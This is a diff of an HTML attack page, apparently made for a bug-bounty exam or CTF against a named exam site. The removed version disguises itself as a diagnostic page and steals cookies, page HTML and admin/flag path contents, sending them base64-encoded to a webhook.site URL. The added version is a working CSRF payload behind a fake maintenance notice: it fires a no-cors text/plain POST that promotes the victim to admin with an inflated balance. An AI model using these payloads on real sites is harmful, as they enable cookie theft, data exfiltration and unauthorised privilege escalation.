@@ -1,47 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Diagnostic Page</title>
-</head>
-<body style="background-color: black; color: lime; font-family: monospace;">
-    <h1>SYSTEM SCANNING...</h1>
-    <div id="status">Contacting internal server...</div>
-
+<body>
     <script>
-        // YOUR WEBHOOK URL
-        const myWebhook = "https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00";
+        // 1. Target URL (Adjust this if the API path is different)
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/api/v1/profile/update";
 
-        async function exfiltrate() {
-            let dataLeak = {};
+        // 2. The Data: We are telling the server to update the user to Admin
+        const exploitData = JSON.stringify({
+            "fullName": "Saja Pwned",
+            "role": "admin",
+            "balance": 999999
+        });
 
-            // 1. Try to grab the Bot's Cookies
-            dataLeak.cookies = document.cookie || "No cookies accessible";
+        // 3. Execution: Using fetch with 'no-cors' to fire the request
+        // Even if it 'fails' due to CORS, the request still HITS the server 
+        // and executes with the Admin's cookies!
+        fetch(targetUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'text/plain' // Using text/plain to avoid preflight
+            },
+            body: exploitData
+        });
 
-            // 2. Try to grab the content of the current page (where the bot is)
-            dataLeak.current_html = document.body.innerHTML;
-
-            // 3. Try to fetch the secret Admin Flag page
-            // High-value CTF flags are often at these paths
-            const internalPaths = ['/admin', '/admin/flag', '/api/flag', '/settings'];
-            
-            for (let path of internalPaths) {
-                try {
-                    let response = await fetch(path);
-                    let text = await response.text();
-                    dataLeak[`path_${path.replace(/\//g, '_')}`] = text;
-                } catch (e) {
-                    dataLeak[`path_${path}`] = "Failed to fetch";
-                }
-            }
-
-            // 4. Send everything to your Webhook
-            // We use Base64 encoding (btoa) so special characters don't break the URL
-            const encodedData = btoa(JSON.stringify(dataLeak));
-            fetch(`${myWebhook}?vault=${encodedData}`, { mode: 'no-cors' });
-        }
-
-        // Run the exploit
-        exfiltrate();
+        console.log("Exploit launched. Check your dashboard.");
     </script>
+    <h1>System Maintenance in Progress...</h1>
 </body>
 </html>
